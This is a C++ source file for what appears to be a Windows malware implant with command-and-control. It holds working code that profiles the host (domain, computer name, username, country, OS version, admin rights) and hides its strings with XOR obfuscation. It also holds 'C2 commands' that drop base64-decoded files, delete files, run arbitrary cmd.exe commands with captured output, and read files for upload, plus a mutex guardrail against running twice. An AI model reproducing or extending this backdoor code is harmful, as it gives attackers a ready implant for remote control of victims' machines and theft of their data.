    #include "core.hpp"


    namespace Recon {

    // recon performed against the local system
    namespace LocalSystem {

        std::string GetCountryCode() {
            std::string countryCode;
            GEOID geoId = GetUserGeoID(GEOCLASS_NATION);
            WCHAR geoISO[10];
            if (GetGeoInfoW(geoId, GEO_ISO2, geoISO, 10, 0) > 0) {
                wchar_t* wPtr = &geoISO[0];
                while (*wPtr) {
                    countryCode += static_cast<char>(*wPtr);
                    ++wPtr;
                }
            }

            return countryCode;
        }

        std::string GetSystemDomainName() {
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);
            char hostname[256];

            gethostname(hostname, sizeof(hostname));

            addrinfo hints = {};
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_flags = AI_CANONNAME;

            addrinfo* info;

            if (getaddrinfo(hostname, nullptr, &hints, &info) != 0) {
                WSACleanup();
                common::LogWarning(XOR_LIT("Unable to get domain name"));
                return XOR_LIT("Unable to get domain name");
            }

            std::string domainName = info->ai_canonname;
            freeaddrinfo(info);
            WSACleanup();
            return domainName;

        }

        std::string GetSystemComputerName() {
            char computerName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

            if (!GetComputerName(computerName, &size)) {
                common::LogWarning(XOR_LIT("Unable to retrieve computer name"));
                return XOR_LIT("Unable to retrieve computer name");
            }

            return std::string(computerName);
        }

        std::string GetWindowsVersion() {
            HMODULE hMod = GetModuleHandleW(XOR_WIDE_LIT(L"ntdll.dll"));
            if (hMod) {
                RtlGetVersionPtr rtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, XOR_LIT("RtlGetVersion"));
                if (rtlGetVersion != nullptr) {
                    RTL_OSVERSIONINFOW rovi = { 0 };
                    rovi.dwOSVersionInfoSize = sizeof(rovi);
                    if (rtlGetVersion(&rovi) == 0) {
                        return std::to_string(rovi.dwMajorVersion) + "." + std::to_string(rovi.dwMinorVersion) + XOR_LIT(" (Build ")
                            + std::to_string(rovi.dwBuildNumber) + ")";
                    }
                }
            }
            common::LogWarning(XOR_LIT("Unable to retrieve Windows version"));
            return XOR_LIT("Unable to retrieve Windows version");

        }

        BOOL IsProcessAdmin() {
            HANDLE hToken = NULL;
            DWORD dwSize = 0;
            DWORD dwIntegrityLevel = NULL;
            DWORD dwError = ERROR_SUCCESS;
            PTOKEN_MANDATORY_LABEL pInteg = NULL;

            // get process token
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
                dwError = GetLastError();
                common::LogError(XOR_LIT("Error opening process token: ") + dwError);
                CloseHandle(hToken);
                return FALSE;
            }

            // get token size
            if (GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize)) {
                dwError = GetLastError();
                common::LogError(XOR_LIT("Error getting token information: {}") + dwError);
                CloseHandle(hToken);
                return FALSE;
            }

            pInteg = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwSize);
            if (pInteg == NULL) {
                dwError = GetLastError();
                common::LogError(XOR_LIT("Error allocating integrity space: {}") + dwError);
                CloseHandle(hToken);
                LocalFree(pInteg);
                return FALSE;
            }

            if (!GetTokenInformation(hToken, TokenIntegrityLevel, pInteg, dwSize, &dwSize)) {
                dwError = GetLastError();
                common::LogError(XOR_LIT("Error getting token information pInteg: {}") + dwError);
                CloseHandle(hToken);
                LocalFree(pInteg);
                return FALSE;
            }

            // check if integity is "high" or above
            dwIntegrityLevel = *GetSidSubAuthority(pInteg->Label.Sid, 0);
            if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
                common::LogInfo(XOR_LIT("Process is high integrity"));
                CloseHandle(hToken);
                LocalFree(pInteg);
                return TRUE;
            }
                
            common::LogInfo(XOR_LIT("Process is not high integrity"));
            CloseHandle(hToken);
            LocalFree(pInteg);
            return FALSE;

        }

        std::string GetSystemUsername() {
            char username[UNLEN + 1];
            DWORD username_len = UNLEN + 1;

            if (GetUserNameA(username, &username_len)) {
                return std::string(username);
            }
            else {
                common::LogWarning(XOR_LIT("Unable to retrieve username"));
                return XOR_LIT("Unable to retrieve username");
            }
        }
    }

    std::string InitRecon() {
        bool isAdmin = Recon::LocalSystem::IsProcessAdmin();

        nlohmann::json reconData;
        reconData[XOR_LIT("ver")] = XOR_LIT("2.0");
        reconData[XOR_LIT("domain")] = Recon::LocalSystem::GetSystemDomainName();
        reconData[XOR_LIT("pc")] = Recon::LocalSystem::GetSystemComputerName();
        reconData[XOR_LIT("username")] = Recon::LocalSystem::GetSystemUsername();
        reconData[XOR_LIT("cc")] = Recon::LocalSystem::GetCountryCode();
        reconData[XOR_LIT("os")] = Recon::LocalSystem::GetWindowsVersion();
        if (isAdmin) {
            reconData[XOR_LIT("rights")] = XOR_LIT("Admin");
        }
        else {
            reconData[XOR_LIT("rights")] = XOR_LIT("User");
        }
        reconData[XOR_LIT("proxyenabled")] = 0;
        
        return reconData.dump();
    }

    }

    // C2 commands
    namespace Commands {

    int cmdCreateFile(std::string filePath, std::string fileContents) {
        std::ofstream fileStream(filePath, std::ios::binary);

        if (!fileStream) {
            common::LogError(XOR_LIT("Unable to create file at: ") + filePath);
            return 1;
        }

        // Base64 decode
        std::string decodedData = base64_decode_string(fileContents);

        // Write file data
        fileStream.write(decodedData.c_str(), decodedData.size());

        // Close file
        fileStream.close();
        return 0;
    }

    int cmdDeleteFile(std::string filePath) {
        try {
            // check file exists
            if (!std::filesystem::exists(filePath)) {
                common::LogWarning(XOR_LIT("File does not exist"));
                return 1; // although its not really an error condidtion since the file is already gone we will return 1
                            // for now in case we want to done something with it later
            }

            // delete file
            std::filesystem::remove(filePath);
            return 0;
        }
        catch (const std::filesystem::filesystem_error& e) {
            common::LogWarning(XOR_LIT("Filesystem error: ") + std::string{ e.what() });
        }
        catch (const std::exception& e) {
            common::LogWarning(XOR_LIT("Standard exception: ") + std::string{ e.what() });
        }
        return 1;
    }

    std::string cmdExecuteCommand(std::string command) {
        std::string data;
        std::array<char, 256> buffer;
        HANDLE hStdOutPipeRead = NULL;
        HANDLE hStdOutPipeWrite = NULL;

        SECURITY_ATTRIBUTES sa(sizeof(SECURITY_ATTRIBUTES), NULL, TRUE);

        // Create pipe for stdout/stderr
        if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0)) {
            common::LogError(XOR_LIT("Failed to create STDOUT named pipe"));
            return XOR_LIT("Failed to create STDOUT named pipe");
        }

        // Ensure read handle for STDOUT not inherited
        if (!SetHandleInformation(hStdOutPipeRead, HANDLE_FLAG_INHERIT, 0)) {
            common::LogError(XOR_LIT("Failed to set handle flag"));
            return XOR_LIT("Failed to set handle flag");
        }

        // create process
        PROCESS_INFORMATION pi;
        STARTUPINFO si;
        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        ZeroMemory(&si, sizeof(STARTUPINFO));
        si.cb = sizeof(STARTUPINFO);
        si.hStdError = hStdOutPipeWrite;
        si.hStdOutput = hStdOutPipeWrite;
        si.dwFlags |= STARTF_USESTDHANDLES;
        std::string cmd = "cmd.exe /C " + command;

        if (!CreateProcess(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            common::LogError(XOR_LIT("Failed to create process"));
            return XOR_LIT("Failed to create process");
        }

        // close handle
        CloseHandle(hStdOutPipeWrite);

        // read stdout/stderr from pipe
        DWORD bytesRead;
        while (ReadFile(hStdOutPipeRead, buffer.data(), buffer.size(), &bytesRead, NULL) != FALSE) {
            data.append(buffer.data(), bytesRead);
        }

        // close handles
        CloseHandle(hStdOutPipeRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);


        return data;
    }

    std::string cmdUploadFile(std::string filePath) {
        std::ifstream file(filePath, std::ios::binary);

        if (!file) {
            common::LogError(XOR_LIT("Unable to open file: ") + filePath);
            return "";
        }

        std::vector<unsigned char> buffer(std::istreambuf_iterator<char>(file), {});
        file.close();

        return common::Base64Encode(buffer);
    }
    }

    // Execution guardrails
    namespace Guardrails {

    BOOL CheckCreateMutex() {
        HANDLE hMutex = CreateMutex(NULL, FALSE, Settings::MUTEX_NAME.c_str());
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            common::LogError(XOR_LIT("Mutex already exists! Closing application."));
            CloseHandle(hMutex);
            return FALSE;
        }

        common::LogInfo(XOR_LIT("Mutex Created."));
        return TRUE;
    }
    }